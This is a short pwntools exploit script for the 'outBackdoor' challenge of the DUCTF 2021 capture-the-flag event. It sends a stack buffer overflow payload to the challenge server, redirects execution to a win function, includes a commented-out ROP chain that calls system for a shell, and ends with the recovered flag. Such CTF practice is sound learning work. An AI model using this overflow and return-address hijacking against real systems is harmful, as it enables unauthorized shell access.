from pwn import *
h,p = 'pwn-2021.duc.tf', 31921
p = remote(h,p)
#p = process("./outBackdoor")
#gdb.attach('outBackdoor')
win = 0x0000000004011D7
poprdi = 0x000000000040125b
sh = 0x0000000004020CD
system = 0x000000000401050
#exp = "A"*0x10+p64(1)+p64(poprdi)+p64(sh)+p64(system)
exp = "A"*0x10+p64(1)+p64(0x000000004011E7)

p.sendlineafter('could play a song?',exp)
p.interactive()
#DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
